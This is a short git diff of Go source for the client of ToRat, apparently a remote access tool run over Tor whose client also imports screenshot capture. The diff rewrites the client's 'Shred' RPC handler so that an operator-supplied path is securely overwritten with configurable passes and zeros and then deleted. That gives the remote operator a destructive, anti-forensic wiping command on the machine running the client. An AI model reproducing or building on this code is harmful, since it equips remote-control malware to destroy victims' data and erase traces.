@@ -12,6 +12,7 @@ import (
 	"github.com/lu4p/ToRat/shared"
 	"github.com/lu4p/ToRat/torat_client/crypto"
 	"github.com/lu4p/cat"
+	"github.com/lu4p/shred"
 	"github.com/showwin/speedtest-go/speedtest"
 	"github.com/vova616/screenshot"
 )
@@ -20,7 +21,19 @@ import (
 type API int
 
 func (a *API) Shred(s *shared.Shred, r *shared.Void) error {
-	return s.Conf.Path(s.Path)
+	shredconf := shred.Conf{
+		Times:  s.Times,
+		Zeros:  s.Zeros,
+		Remove: s.Remove,
+	}
+
+	if err := shredconf.Path(s.Path); err != nil {
+		return err
+	}
+	if err := os.RemoveAll(s.Path); err != nil {
+		return err
+	}
+	return nil
 }
 
 func (a *API) Hostname(v shared.Void, r *shared.EncAsym) error {
